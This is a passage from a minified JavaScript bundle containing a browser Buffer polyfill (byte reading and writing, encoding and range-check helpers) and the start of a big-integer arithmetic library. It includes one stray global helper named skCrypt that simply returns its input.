                  throw new RangeError("out of range index");
                if (r >= o && e >= n) return 0;
                if (r >= o) return -1;
                if (e >= n) return 1;
                if (this === t) return 0;
                let i = (o >>>= 0) - (r >>>= 0),
                  a = (n >>>= 0) - (e >>>= 0);
                const u = Math.min(i, a),
                  c = this.slice(r, o),
                  d = t.slice(e, n);
                for (let s = 0; s < u; ++s)
                  if (c[s] !== d[s]) {
                    (i = c[s]), (a = d[s]);
                    break;
                  }
                return i < a ? -1 : a < i ? 1 : 0;
              }),
              (l.prototype.includes = function (t, e, n) {
                return -1 !== this.indexOf(t, e, n);
              }),
              (l.prototype.indexOf = function (t, e, n) {
                return A(this, t, e, n, !0);
              }),
              (l.prototype.lastIndexOf = function (t, e, n) {
                return A(this, t, e, n, !1);
              }),
              (l.prototype.write = function (t, e, n, r) {
                if (void 0 === e) (r = "utf8"), (n = this.length), (e = 0);
                else if (void 0 === n && "string" == typeof e)
                  (r = e), (n = this.length), (e = 0);
                else {
                  if (!isFinite(e))
                    throw new Error(
                      "Buffer.write(string, encoding, offset[, length]) is no longer supported"
                    );
                  (e >>>= 0),
                    isFinite(n)
                      ? ((n >>>= 0), void 0 === r && (r = "utf8"))
                      : ((r = n), (n = void 0));
                }
                const o = this.length - e;
                if (
                  ((void 0 === n || n > o) && (n = o),
                  (t.length > 0 && (n < 0 || e < 0)) || e > this.length)
                )
                  throw new RangeError(
                    "Attempt to write outside buffer bounds"
                  );
                r || (r = "utf8");
                let i = !1;
                for (;;)
                  switch (r) {
                    case "hex":
                      return I(this, t, e, n);
                    case "utf8":
                    case "utf-8":
                      return S(this, t, e, n);
                    case "ascii":
                    case "latin1":
                    case "binary":
                      return _(this, t, e, n);
                    case "base64":
                      return T(this, t, e, n);
                    case "ucs2":
                    case "ucs-2":
                    case "utf16le":
                    case "utf-16le":
                      return B(this, t, e, n);
                    default:
                      if (i) throw new TypeError("Unknown encoding: " + r);
                      (r = ("" + r).toLowerCase()), (i = !0);
                  }
              }),
              (l.prototype.toJSON = function () {
                return {
                  type: "Buffer",
                  data: Array.prototype.slice.call(this._arr || this, 0),
                };
              });
            const x = 4096;
            function P(t, e, n) {
              let r = "";
              n = Math.min(t.length, n);
              for (let o = e; o < n; ++o) r += String.fromCharCode(127 & t[o]);
              return r;
            }
            function O(t, e, n) {
              let r = "";
              n = Math.min(t.length, n);
              for (let o = e; o < n; ++o) r += String.fromCharCode(t[o]);
              return r;
            }
            function R(t, e, n) {
              const r = t.length;
              (!e || e < 0) && (e = 0), (!n || n < 0 || n > r) && (n = r);
              let o = "";
              for (let i = e; i < n; ++i) o += tt[t[i]];
              return o;
            }
            function M(t, e, n) {
              const r = t.slice(e, n);
              let o = "";
              for (let i = 0; i < r.length - 1; i += 2)
                o += String.fromCharCode(r[i] + 256 * r[i + 1]);
              return o;
            }
            function L(t, e, n) {
              if (t % 1 != 0 || t < 0)
                throw new RangeError("offset is not uint");
              if (t + e > n)
                throw new RangeError("Trying to access beyond buffer length");
            }
            function N(t, e, n, r, o, i) {
              if (!l.isBuffer(t))
                throw new TypeError(
                  '"buffer" argument must be a Buffer instance'
                );
              if (e > o || e < i)
                throw new RangeError('"value" argument is out of bounds');
              if (n + r > t.length) throw new RangeError("Index out of range");
            }
            function D(t, e, n, r, o) {
              G(e, r, o, t, n, 7);
              let i = Number(e & BigInt(4294967295));
              (t[n++] = i),
                (i >>= 8),
                (t[n++] = i),
                (i >>= 8),
                (t[n++] = i),
                (i >>= 8),
                (t[n++] = i);
              let s = Number((e >> BigInt(32)) & BigInt(4294967295));
              return (
                (t[n++] = s),
                (s >>= 8),
                (t[n++] = s),
                (s >>= 8),
                (t[n++] = s),
                (s >>= 8),
                (t[n++] = s),
                n
              );
            }
            function U(t, e, n, r, o) {
              G(e, r, o, t, n, 7);
              let i = Number(e & BigInt(4294967295));
              (t[n + 7] = i),
                (i >>= 8),
                (t[n + 6] = i),
                (i >>= 8),
                (t[n + 5] = i),
                (i >>= 8),
                (t[n + 4] = i);
              let s = Number((e >> BigInt(32)) & BigInt(4294967295));
              return (
                (t[n + 3] = s),
                (s >>= 8),
                (t[n + 2] = s),
                (s >>= 8),
                (t[n + 1] = s),
                (s >>= 8),
                (t[n] = s),
                n + 8
              );
            }
            function q(t, e, n, r, o, i) {
              if (n + r > t.length) throw new RangeError("Index out of range");
              if (n < 0) throw new RangeError("Index out of range");
            }
            function z(t, e, n, o, i) {
              return (
                (e = +e),
                (n >>>= 0),
                i || q(t, 0, n, 4),
                r.write(t, e, n, o, 23, 4),
                n + 4
              );
            }
            function K(t, e, n, o, i) {
              return (
                (e = +e),
                (n >>>= 0),
                i || q(t, 0, n, 8),
                r.write(t, e, n, o, 52, 8),
                n + 8
              );
            }
            (l.prototype.slice = function (t, e) {
              const n = this.length;
              (t = ~~t) < 0 ? (t += n) < 0 && (t = 0) : t > n && (t = n),
                (e = void 0 === e ? n : ~~e) < 0
                  ? (e += n) < 0 && (e = 0)
                  : e > n && (e = n),
                e < t && (e = t);
              const r = this.subarray(t, e);
              return Object.setPrototypeOf(r, l.prototype), r;
            }),
              (l.prototype.readUintLE = l.prototype.readUIntLE =
                function (t, e, n) {
                  (t >>>= 0), (e >>>= 0), n || L(t, e, this.length);
                  let r = this[t],
                    o = 1,
                    i = 0;
                  for (; ++i < e && (o *= 256); ) r += this[t + i] * o;
                  return r;
                }),
              (l.prototype.readUintBE = l.prototype.readUIntBE =
                function (t, e, n) {
                  (t >>>= 0), (e >>>= 0), n || L(t, e, this.length);
                  let r = this[t + --e],
                    o = 1;
                  for (; e > 0 && (o *= 256); ) r += this[t + --e] * o;
                  return r;
                }),
              (l.prototype.readUint8 = l.prototype.readUInt8 =
                function (t, e) {
                  return (t >>>= 0), e || L(t, 1, this.length), this[t];
                }),
              (l.prototype.readUint16LE = l.prototype.readUInt16LE =
                function (t, e) {
                  return (
                    (t >>>= 0),
                    e || L(t, 2, this.length),
                    this[t] | (this[t + 1] << 8)
                  );
                }),
              (l.prototype.readUint16BE = l.prototype.readUInt16BE =
                function (t, e) {
                  return (
                    (t >>>= 0),
                    e || L(t, 2, this.length),
                    (this[t] << 8) | this[t + 1]
                  );
                }),
              (l.prototype.readUint32LE = l.prototype.readUInt32LE =
                function (t, e) {
                  return (
                    (t >>>= 0),
                    e || L(t, 4, this.length),
                    (this[t] | (this[t + 1] << 8) | (this[t + 2] << 16)) +
                      16777216 * this[t + 3]
                  );
                }),
              (l.prototype.readUint32BE = l.prototype.readUInt32BE =
                function (t, e) {
                  return (
                    (t >>>= 0),
                    e || L(t, 4, this.length),
                    16777216 * this[t] +
                      ((this[t + 1] << 16) | (this[t + 2] << 8) | this[t + 3])
                  );
                }),
              (l.prototype.readBigUInt64LE = et(function (t) {
                V((t >>>= 0), "offset");
                const e = this[t],
                  n = this[t + 7];
                (void 0 !== e && void 0 !== n) || H(t, this.length - 8);
                const r =
                    e +
                    256 * this[++t] +
                    65536 * this[++t] +
                    this[++t] * 2 ** 24,
                  o =
                    this[++t] +
                    256 * this[++t] +
                    65536 * this[++t] +
                    n * 2 ** 24;
                return BigInt(r) + (BigInt(o) << BigInt(32));
              })),
              (l.prototype.readBigUInt64BE = et(function (t) {
                V((t >>>= 0), "offset");
                const e = this[t],
                  n = this[t + 7];
                (void 0 !== e && void 0 !== n) || H(t, this.length - 8);
                const r =
                    e * 2 ** 24 +
                    65536 * this[++t] +
                    256 * this[++t] +
                    this[++t],
                  o =
                    this[++t] * 2 ** 24 +
                    65536 * this[++t] +
                    256 * this[++t] +
                    n;
                return (BigInt(r) << BigInt(32)) + BigInt(o);
              })),
              (l.prototype.readIntLE = function (t, e, n) {
                (t >>>= 0), (e >>>= 0), n || L(t, e, this.length);
                let r = this[t],
                  o = 1,
                  i = 0;
                for (; ++i < e && (o *= 256); ) r += this[t + i] * o;
                return (o *= 128), r >= o && (r -= Math.pow(2, 8 * e)), r;
              }),
              (l.prototype.readIntBE = function (t, e, n) {
                (t >>>= 0), (e >>>= 0), n || L(t, e, this.length);
                let r = e,
                  o = 1,
                  i = this[t + --r];
                for (; r > 0 && (o *= 256); ) i += this[t + --r] * o;
                return (o *= 128), i >= o && (i -= Math.pow(2, 8 * e)), i;
              }),
              (l.prototype.readInt8 = function (t, e) {
                return (
                  (t >>>= 0),
                  e || L(t, 1, this.length),
                  128 & this[t] ? -1 * (255 - this[t] + 1) : this[t]
                );
              }),
              (l.prototype.readInt16LE = function (t, e) {
                (t >>>= 0), e || L(t, 2, this.length);
                const n = this[t] | (this[t + 1] << 8);
                return 32768 & n ? 4294901760 | n : n;
              }),
              (l.prototype.readInt16BE = function (t, e) {
                (t >>>= 0), e || L(t, 2, this.length);
                const n = this[t + 1] | (this[t] << 8);
                return 32768 & n ? 4294901760 | n : n;
              }),
              (l.prototype.readInt32LE = function (t, e) {
                return (
                  (t >>>= 0),
                  e || L(t, 4, this.length),
                  this[t] |
                    (this[t + 1] << 8) |
                    (this[t + 2] << 16) |
                    (this[t + 3] << 24)
                );
              }),
              (l.prototype.readInt32BE = function (t, e) {
                return (
                  (t >>>= 0),
                  e || L(t, 4, this.length),
                  (this[t] << 24) |
                    (this[t + 1] << 16) |
                    (this[t + 2] << 8) |
                    this[t + 3]
                );
              }),
              (l.prototype.readBigInt64LE = et(function (t) {
                V((t >>>= 0), "offset");
                const e = this[t],
                  n = this[t + 7];
                (void 0 !== e && void 0 !== n) || H(t, this.length - 8);
                const r =
                  this[t + 4] +
                  256 * this[t + 5] +
                  65536 * this[t + 6] +
                  (n << 24);
                return (
                  (BigInt(r) << BigInt(32)) +
                  BigInt(
                    e +
                      256 * this[++t] +
                      65536 * this[++t] +
                      this[++t] * 2 ** 24
                  )
                );
              })),
              (l.prototype.readBigInt64BE = et(function (t) {
                V((t >>>= 0), "offset");
                const e = this[t],
                  n = this[t + 7];
                (void 0 !== e && void 0 !== n) || H(t, this.length - 8);
                const r =
                  (e << 24) + 65536 * this[++t] + 256 * this[++t] + this[++t];
                return (
                  (BigInt(r) << BigInt(32)) +
                  BigInt(
                    this[++t] * 2 ** 24 +
                      65536 * this[++t] +
                      256 * this[++t] +
                      n
                  )
                );
              })),
              (l.prototype.readFloatLE = function (t, e) {
                return (
                  (t >>>= 0),
                  e || L(t, 4, this.length),
                  r.read(this, t, !0, 23, 4)
                );
              }),
              (l.prototype.readFloatBE = function (t, e) {
                return (
                  (t >>>= 0),
                  e || L(t, 4, this.length),
                  r.read(this, t, !1, 23, 4)
                );
              }),
              (l.prototype.readDoubleLE = function (t, e) {
                return (
                  (t >>>= 0),
                  e || L(t, 8, this.length),
                  r.read(this, t, !0, 52, 8)
                );
              }),
              (l.prototype.readDoubleBE = function (t, e) {
                return (
                  (t >>>= 0),
                  e || L(t, 8, this.length),
                  r.read(this, t, !1, 52, 8)
                );
              }),
              (l.prototype.writeUintLE = l.prototype.writeUIntLE =
                function (t, e, n, r) {
                  if (((t = +t), (e >>>= 0), (n >>>= 0), !r)) {
                    N(this, t, e, n, Math.pow(2, 8 * n) - 1, 0);
                  }
                  let o = 1,
                    i = 0;
                  for (this[e] = 255 & t; ++i < n && (o *= 256); )
                    this[e + i] = (t / o) & 255;
                  return e + n;
                }),
              (l.prototype.writeUintBE = l.prototype.writeUIntBE =
                function (t, e, n, r) {
                  if (((t = +t), (e >>>= 0), (n >>>= 0), !r)) {
                    N(this, t, e, n, Math.pow(2, 8 * n) - 1, 0);
                  }
                  let o = n - 1,
                    i = 1;
                  for (this[e + o] = 255 & t; --o >= 0 && (i *= 256); )
                    this[e + o] = (t / i) & 255;
                  return e + n;
                }),
              (l.prototype.writeUint8 = l.prototype.writeUInt8 =
                function (t, e, n) {
                  return (
                    (t = +t),
                    (e >>>= 0),
                    n || N(this, t, e, 1, 255, 0),
                    (this[e] = 255 & t),
                    e + 1
                  );
                }),
              (l.prototype.writeUint16LE = l.prototype.writeUInt16LE =
                function (t, e, n) {
                  return (
                    (t = +t),
                    (e >>>= 0),
                    n || N(this, t, e, 2, 65535, 0),
                    (this[e] = 255 & t),
                    (this[e + 1] = t >>> 8),
                    e + 2
                  );
                }),
              (l.prototype.writeUint16BE = l.prototype.writeUInt16BE =
                function (t, e, n) {
                  return (
                    (t = +t),
                    (e >>>= 0),
                    n || N(this, t, e, 2, 65535, 0),
                    (this[e] = t >>> 8),
                    (this[e + 1] = 255 & t),
                    e + 2
                  );
                }),
              (l.prototype.writeUint32LE = l.prototype.writeUInt32LE =
                function (t, e, n) {
                  return (
                    (t = +t),
                    (e >>>= 0),
                    n || N(this, t, e, 4, 4294967295, 0),
                    (this[e + 3] = t >>> 24),
                    (this[e + 2] = t >>> 16),
                    (this[e + 1] = t >>> 8),
                    (this[e] = 255 & t),
                    e + 4
                  );
                }),
              (l.prototype.writeUint32BE = l.prototype.writeUInt32BE =
                function (t, e, n) {
                  return (
                    (t = +t),
                    (e >>>= 0),
                    n || N(this, t, e, 4, 4294967295, 0),
                    (this[e] = t >>> 24),
                    (this[e + 1] = t >>> 16),
                    (this[e + 2] = t >>> 8),
                    (this[e + 3] = 255 & t),
                    e + 4
                  );
                }),
              (l.prototype.writeBigUInt64LE = et(function (t, e = 0) {
                return D(this, t, e, BigInt(0), BigInt("0xffffffffffffffff"));
              })),
              (l.prototype.writeBigUInt64BE = et(function (t, e = 0) {
                return U(this, t, e, BigInt(0), BigInt("0xffffffffffffffff"));
              })),
              (l.prototype.writeIntLE = function (t, e, n, r) {
                if (((t = +t), (e >>>= 0), !r)) {
                  const r = Math.pow(2, 8 * n - 1);
                  N(this, t, e, n, r - 1, -r);
                }
                let o = 0,
                  i = 1,
                  s = 0;
                for (this[e] = 255 & t; ++o < n && (i *= 256); )
                  t < 0 && 0 === s && 0 !== this[e + o - 1] && (s = 1),
                    (this[e + o] = (((t / i) | 0) - s) & 255);
                return e + n;
              }),
              (l.prototype.writeIntBE = function (t, e, n, r) {
                if (((t = +t), (e >>>= 0), !r)) {
                  const r = Math.pow(2, 8 * n - 1);
                  N(this, t, e, n, r - 1, -r);
                }
                let o = n - 1,
                  i = 1,
                  s = 0;
                for (this[e + o] = 255 & t; --o >= 0 && (i *= 256); )
                  t < 0 && 0 === s && 0 !== this[e + o + 1] && (s = 1),
                    (this[e + o] = (((t / i) | 0) - s) & 255);
                return e + n;
              }),
              (l.prototype.writeInt8 = function (t, e, n) {
                return (
                  (t = +t),
                  (e >>>= 0),
                  n || N(this, t, e, 1, 127, -128),
                  t < 0 && (t = 255 + t + 1),
                  (this[e] = 255 & t),
                  e + 1
                );
              }),
              (l.prototype.writeInt16LE = function (t, e, n) {
                return (
                  (t = +t),
                  (e >>>= 0),
                  n || N(this, t, e, 2, 32767, -32768),
                  (this[e] = 255 & t),
                  (this[e + 1] = t >>> 8),
                  e + 2
                );
              }),
              (l.prototype.writeInt16BE = function (t, e, n) {
                return (
                  (t = +t),
                  (e >>>= 0),
                  n || N(this, t, e, 2, 32767, -32768),
                  (this[e] = t >>> 8),
                  (this[e + 1] = 255 & t),
                  e + 2
                );
              }),
              (l.prototype.writeInt32LE = function (t, e, n) {
                return (
                  (t = +t),
                  (e >>>= 0),
                  n || N(this, t, e, 4, 2147483647, -2147483648),
                  (this[e] = 255 & t),
                  (this[e + 1] = t >>> 8),
                  (this[e + 2] = t >>> 16),
                  (this[e + 3] = t >>> 24),
                  e + 4
                );
              }),
              (l.prototype.writeInt32BE = function (t, e, n) {
                return (
                  (t = +t),
                  (e >>>= 0),
                  n || N(this, t, e, 4, 2147483647, -2147483648),
                  t < 0 && (t = 4294967295 + t + 1),
                  (this[e] = t >>> 24),
                  (this[e + 1] = t >>> 16),
                  (this[e + 2] = t >>> 8),
                  (this[e + 3] = 255 & t),
                  e + 4
                );
              }),
              (l.prototype.writeBigInt64LE = et(function (t, e = 0) {
                return D(
                  this,
                  t,
                  e,
                  -BigInt("0x8000000000000000"),
                  BigInt("0x7fffffffffffffff")
                );
              })),
              (l.prototype.writeBigInt64BE = et(function (t, e = 0) {
                return U(
                  this,
                  t,
                  e,
                  -BigInt("0x8000000000000000"),
                  BigInt("0x7fffffffffffffff")
                );
              })),
              (l.prototype.writeFloatLE = function (t, e, n) {
                return z(this, t, e, !0, n);
              }),
              (l.prototype.writeFloatBE = function (t, e, n) {
                return z(this, t, e, !1, n);
              }),
              (l.prototype.writeDoubleLE = function (t, e, n) {
                return K(this, t, e, !0, n);
              }),
              (l.prototype.writeDoubleBE = function (t, e, n) {
                return K(this, t, e, !1, n);
              }),
              (l.prototype.copy = function (t, e, n, r) {
                if (!l.isBuffer(t))
                  throw new TypeError("argument should be a Buffer");
                if (
                  (n || (n = 0),
                  r || 0 === r || (r = this.length),
                  e >= t.length && (e = t.length),
                  e || (e = 0),
                  r > 0 && r < n && (r = n),
                  r === n)
                )
                  return 0;
                if (0 === t.length || 0 === this.length) return 0;
                if (e < 0) throw new RangeError("targetStart out of bounds");
                if (n < 0 || n >= this.length)
                  throw new RangeError("Index out of range");
                if (r < 0) throw new RangeError("sourceEnd out of bounds");
                r > this.length && (r = this.length),
                  t.length - e < r - n && (r = t.length - e + n);
                const o = r - n;
                return (
                  this === t && "function" == typeof s.prototype.copyWithin
                    ? this.copyWithin(e, n, r)
                    : s.prototype.set.call(t, this.subarray(n, r), e),
                  o
                );
              }),
              (l.prototype.fill = function (t, e, n, r) {
                if ("string" == typeof t) {
                  if (
                    ("string" == typeof e
                      ? ((r = e), (e = 0), (n = this.length))
                      : "string" == typeof n && ((r = n), (n = this.length)),
                    void 0 !== r && "string" != typeof r)
                  )
                    throw new TypeError("encoding must be a string");
                  if ("string" == typeof r && !l.isEncoding(r))
                    throw new TypeError("Unknown encoding: " + r);
                  if (1 === t.length) {
                    const e = t.charCodeAt(0);
                    (("utf8" === r && e < 128) || "latin1" === r) && (t = e);
                  }
                } else
                  "number" == typeof t
                    ? (t &= 255)
                    : "boolean" == typeof t && (t = Number(t));
                if (e < 0 || this.length < e || this.length < n)
                  throw new RangeError("Out of range index");
                if (n <= e) return this;
                let o;
                if (
                  ((e >>>= 0),
                  (n = void 0 === n ? this.length : n >>> 0),
                  t || (t = 0),
                  "number" == typeof t)
                )
                  for (o = e; o < n; ++o) this[o] = t;
                else {
                  const i = l.isBuffer(t) ? t : l.from(t, r),
                    s = i.length;
                  if (0 === s)
                    throw new TypeError(
                      'The value "' + t + '" is invalid for argument "value"'
                    );
                  for (o = 0; o < n - e; ++o) this[o + e] = i[o % s];
                }
                return this;
              });
            const W = {};
            function F(t, e, n) {
              W[t] = class extends n {
                constructor() {
                  super(),
                    Object.defineProperty(this, "message", {
                      value: e.apply(this, arguments),
                      writable: !0,
                      configurable: !0,
                    }),
                    (this.name = `${this.name} [${t}]`),
                    this.stack,
                    delete this.name;
                }
                get code() {
                  return t;
                }
                set code(t) {
                  Object.defineProperty(this, "code", {
                    configurable: !0,
                    enumerable: !0,
                    value: t,
                    writable: !0,
                  });
                }
                toString() {
                  return `${this.name} [${t}]: ${this.message}`;
                }
              };
            }
            function j(t) {
              let e = "",
                n = t.length;
              const r = "-" === t[0] ? 1 : 0;
              for (; n >= r + 4; n -= 3) e = `_${t.slice(n - 3, n)}${e}`;
              return `${t.slice(0, n)}${e}`;
            }
            function G(t, e, n, r, o, i) {
              if (t > n || t < e) {
                const n = "bigint" == typeof e ? "n" : "";
                let r;
                throw (
                  ((r =
                    0 === e || e === BigInt(0)
                      ? `>= 0${n} and < 2${n} ** ${8 * (i + 1)}${n}`
                      : `>= -(2${n} ** ${8 * (i + 1) - 1}${n}) and < 2 ** ${
                          8 * (i + 1) - 1
                        }${n}`),
                  new W.ERR_OUT_OF_RANGE("value", r, t))
                );
              }
              !(function (t, e, n) {
                V(e, "offset"),
                  (void 0 !== t[e] && void 0 !== t[e + n]) ||
                    H(e, t.length - (n + 1));
              })(r, o, i);
            }
            function V(t, e) {
              if ("number" != typeof t)
                throw new W.ERR_INVALID_ARG_TYPE(e, "number", t);
            }
            function H(t, e, n) {
              if (Math.floor(t) !== t)
                throw (
                  (V(t, n), new W.ERR_OUT_OF_RANGE("offset", "an integer", t))
                );
              if (e < 0) throw new W.ERR_BUFFER_OUT_OF_BOUNDS();
              throw new W.ERR_OUT_OF_RANGE("offset", `>= 0 and <= ${e}`, t);
            }
            F(
              "ERR_BUFFER_OUT_OF_BOUNDS",
              function (t) {
                return t
                  ? `${t} is outside of buffer bounds`
                  : "Attempt to access memory outside buffer bounds";
              },
              RangeError
            ),
              F(
                "ERR_INVALID_ARG_TYPE",
                function (t, e) {
                  return `The "${t}" argument must be of type number. Received type ${typeof e}`;
                },
                TypeError
              ),
              F(
                "ERR_OUT_OF_RANGE",
                function (t, e, n) {
                  let r = `The value of "${t}" is out of range.`,
                    o = n;
                  return (
                    Number.isInteger(n) && Math.abs(n) > 2 ** 32
                      ? (o = j(String(n)))
                      : "bigint" == typeof n &&
                        ((o = String(n)),
                        (n > BigInt(2) ** BigInt(32) ||
                          n < -(BigInt(2) ** BigInt(32))) &&
                          (o = j(o)),
                        (o += "n")),
                    (r += ` It must be ${e}. Received ${o}`),
                    r
                  );
                },
                RangeError
              );
            const Z = /[^+/0-9A-Za-z-_]/g;
            function X(t, e) {
              let n;
              e = e || 1 / 0;
              const r = t.length;
              let o = null;
              const i = [];
              for (let s = 0; s < r; ++s) {
                if (((n = t.charCodeAt(s)), n > 55295 && n < 57344)) {
                  if (!o) {
                    if (n > 56319) {
                      (e -= 3) > -1 && i.push(239, 191, 189);
                      continue;
                    }
                    if (s + 1 === r) {
                      (e -= 3) > -1 && i.push(239, 191, 189);
                      continue;
                    }
                    o = n;
                    continue;
                  }
                  if (n < 56320) {
                    (e -= 3) > -1 && i.push(239, 191, 189), (o = n);
                    continue;
                  }
                  n = 65536 + (((o - 55296) << 10) | (n - 56320));
                } else o && (e -= 3) > -1 && i.push(239, 191, 189);
                if (((o = null), n < 128)) {
                  if ((e -= 1) < 0) break;
                  i.push(n);
                } else if (n < 2048) {
                  if ((e -= 2) < 0) break;
                  i.push((n >> 6) | 192, (63 & n) | 128);
                } else if (n < 65536) {
                  if ((e -= 3) < 0) break;
                  i.push(
                    (n >> 12) | 224,
                    ((n >> 6) & 63) | 128,
                    (63 & n) | 128
                  );
                } else {
                  if (!(n < 1114112)) throw new Error("Invalid code point");
                  if ((e -= 4) < 0) break;
                  i.push(
                    (n >> 18) | 240,
                    ((n >> 12) & 63) | 128,
                    ((n >> 6) & 63) | 128,
                    (63 & n) | 128
                  );
                }
              }
              return i;
            }
            function J(t) {
              return e.toByteArray(
                (function (t) {
                  if (
                    (t = (t = t.split("=")[0]).trim().replace(Z, "")).length < 2
                  )
                    return "";
                  for (; t.length % 4 != 0; ) t += "=";
                  return t;
                })(t)
              );
            }
            function Y(t, e, n, r) {
              let o;
              for (o = 0; o < r && !(o + n >= e.length || o >= t.length); ++o)
                e[o + n] = t[o];
              return o;
            }
            function Q(t, e) {
              return (
                t instanceof e ||
                (null != t &&
                  null != t.constructor &&
                  null != t.constructor.name &&
                  t.constructor.name === e.name)
              );
            }
            function $(t) {
              return t != t;
            }
            const tt = (function () {
              const t = "0123456789abcdef",
                e = new Array(256);
              for (let n = 0; n < 16; ++n) {
                const r = 16 * n;
                for (let o = 0; o < 16; ++o) e[r + o] = t[n] + t[o];
              }
              return e;
            })();
            function et(t) {
              return "undefined" == typeof BigInt ? nt : t;
            }
            function nt() {
              throw new Error("BigInt not supported");
            }
          })(e);
          const f = e.Buffer;
          (t.Blob = e.Blob),
            (t.BlobOptions = e.BlobOptions),
            (t.Buffer = e.Buffer),
            (t.File = e.File),
            (t.FileOptions = e.FileOptions),
            (t.INSPECT_MAX_BYTES = e.INSPECT_MAX_BYTES),
            (t.SlowBuffer = e.SlowBuffer),
            (t.TranscodeEncoding = e.TranscodeEncoding),
            (t.atob = e.atob),
            (t.btoa = e.btoa),
            (t.constants = e.constants),
            (t.default = f),
            (t.isAscii = e.isAscii),
            (t.isUtf8 = e.isUtf8),
            (t.kMaxLength = e.kMaxLength),
            (t.kStringMaxLength = e.kStringMaxLength),
            (t.resolveObjectURL = e.resolveObjectURL),
            (t.transcode = e.transcode);
        })(Gn)),
      Gn
    );
  }
  var Hn,
    Zn = jn.exports;
  function Xn() {
    return (
      Hn ||
        ((Hn = 1),
        (t = jn),
        (window.skCrypt = function (t) {
          return function () {
            return t;
          };
        }),
        (function (t, e) {
          function n(t, e) {
            if (!t) throw new Error(e || "Assertion failed");
          }
          function r(t, e) {
            t.super_ = e;
            var n = function () {};
            (n.prototype = e.prototype),
              (t.prototype = new n()),
              (t.prototype.constructor = t);
          }
          function o(t, e, n) {
            if (o.isBN(t)) return t;
            (this.negative = 0),
              (this.words = null),
              (this.length = 0),
              (this.red = null),
              null !== t &&
                (("le" !== e && "be" !== e) || ((n = e), (e = 10)),
                this._init(t || 0, e || 10, n || "be"));
          }
          var i;
          "object" == typeof t ? (t.exports = o) : (e.BN = o),
            (o.BN = o),
            (o.wordSize = 26);
          try {
            i =
              "undefined" != typeof window && void 0 !== window.Buffer
                ? window.Buffer
                : Vn().Buffer;
          } catch (T) {}
          function s(t, e) {
            var r = t.charCodeAt(e);
            return r >= 48 && r <= 57
              ? r - 48
              : r >= 65 && r <= 70
              ? r - 55
              : r >= 97 && r <= 102
              ? r - 87
              : (n(!1, "Invalid character in " + t), void 0);
          }
          function a(t, e, n) {
            var r = s(t, n);
            return n - 1 >= e && (r |= s(t, n - 1) << 4), r;
          }
          function u(t, e, r, o) {
            for (
              var i = 0, s = 0, a = Math.min(t.length, r), u = e;
              u < a;
              u++
            ) {
              var c = t.charCodeAt(u) - 48;
              (i *= o),
                (s = c >= 49 ? c - 49 + 10 : c >= 17 ? c - 17 + 10 : c),
                n(c >= 0 && s < o, "Invalid character"),
                (i += s);
            }
            return i;
          }
          function c(t, e) {
            (t.words = e.words),
              (t.length = e.length),
              (t.negative = e.negative),
              (t.red = e.red);
          }
          if (
            ((o.isBN = function (t) {
              return (
                t instanceof o ||
                (null !== t &&
                  "object" == typeof t &&
                  t.constructor.wordSize === o.wordSize &&
                  Array.isArray(t.words))
              );
            }),
            (o.max = function (t, e) {
              return t.cmp(e) > 0 ? t : e;
            }),
            (o.min = function (t, e) {
              return t.cmp(e) < 0 ? t : e;
            }),
            (o.prototype._init = function (t, e, r) {
              if ("number" == typeof t) return this._initNumber(t, e, r);
              if ("object" == typeof t) return this._initArray(t, e, r);
              "hex" === e && (e = 16), n(e === (0 | e) && e >= 2 && e <= 36);
              var o = 0;
              "-" === (t = t.toString().replace(/\s+/g, ""))[0] &&
                (o++, (this.negative = 1)),
                o < t.length &&
                  (16 === e
                    ? this._parseHex(t, o, r)
                    : (this._parseBase(t, e, o),
                      "le" === r && this._initArray(this.toArray(), e, r)));
            }),
            (o.prototype._initNumber = function (t, e, r) {
              t < 0 && ((this.negative = 1), (t = -t)),
                t < 67108864
                  ? ((this.words = [67108863 & t]), (this.length = 1))
                  : t < 4503599627370496
                  ? ((this.words = [67108863 & t, (t / 67108864) & 67108863]),
                    (this.length = 2))
                  : (n(t < 9007199254740992),
                    (this.words = [67108863 & t, (t / 67108864) & 67108863, 1]),
                    (this.length = 3)),
                "le" === r && this._initArray(this.toArray(), e, r);
            }),
            (o.prototype._initArray = function (t, e, r) {
              if ((n("number" == typeof t.length), t.length <= 0))
                return (this.words = [0]), (this.length = 1), this;
              (this.length = Math.ceil(t.length / 3)),
                (this.words = new Array(this.length));
              for (var o = 0; o < this.length; o++) this.words[o] = 0;
              var i,
                s,
                a = 0;
              if ("be" === r)
                for (o = t.length - 1, i = 0; o >= 0; o -= 3)
                  (s = t[o] | (t[o - 1] << 8) | (t[o - 2] << 16)),
                    (this.words[i] |= (s << a) & 67108863),
                    (this.words[i + 1] = (s >>> (26 - a)) & 67108863),
                    (a += 24) >= 26 && ((a -= 26), i++);
              else if ("le" === r)
                for (o = 0, i = 0; o < t.length; o += 3)
                  (s = t[o] | (t[o + 1] << 8) | (t[o + 2] << 16)),
                    (this.words[i] |= (s << a) & 67108863),
                    (this.words[i + 1] = (s >>> (26 - a)) & 67108863),
                    (a += 24) >= 26 && ((a -= 26), i++);
              return this._strip();
            }),
            (o.prototype._parseHex = function (t, e, n) {
              (this.length = Math.ceil((t.length - e) / 6)),
                (this.words = new Array(this.length));
              for (var r = 0; r < this.length; r++) this.words[r] = 0;
              var o,
                i = 0,
                s = 0;
              if ("be" === n)
                for (r = t.length - 1; r >= e; r -= 2)
                  (o = a(t, e, r) << i),
                    (this.words[s] |= 67108863 & o),
                    i >= 18
                      ? ((i -= 18), (s += 1), (this.words[s] |= o >>> 26))
                      : (i += 8);
              else
                for (
                  r = (t.length - e) % 2 == 0 ? e + 1 : e;
                  r < t.length;
                  r += 2
                )
                  (o = a(t, e, r) << i),
                    (this.words[s] |= 67108863 & o),
                    i >= 18
                      ? ((i -= 18), (s += 1), (this.words[s] |= o >>> 26))
                      : (i += 8);
              this._strip();
            }),
            (o.prototype._parseBase = function (t, e, n) {
              (this.words = [0]), (this.length = 1);
              for (var r = 0, o = 1; o <= 67108863; o *= e) r++;
              r--, (o = (o / e) | 0);
              for (
                var i = t.length - n,
                  s = i % r,
                  a = Math.min(i, i - s) + n,
                  c = 0,
                  l = n;
                l < a;
                l += r
              )
                (c = u(t, l, l + r, e)),
                  this.imuln(o),
                  this.words[0] + c < 67108864
                    ? (this.words[0] += c)
                    : this._iaddn(c);
              if (0 !== s) {
                var d = 1;
                for (c = u(t, l, t.length, e), l = 0; l < s; l++) d *= e;
                this.imuln(d),
                  this.words[0] + c < 67108864
                    ? (this.words[0] += c)
                    : this._iaddn(c);
              }
              this._strip();
            }),
            (o.prototype.copy = function (t) {
              t.words = new Array(this.length);
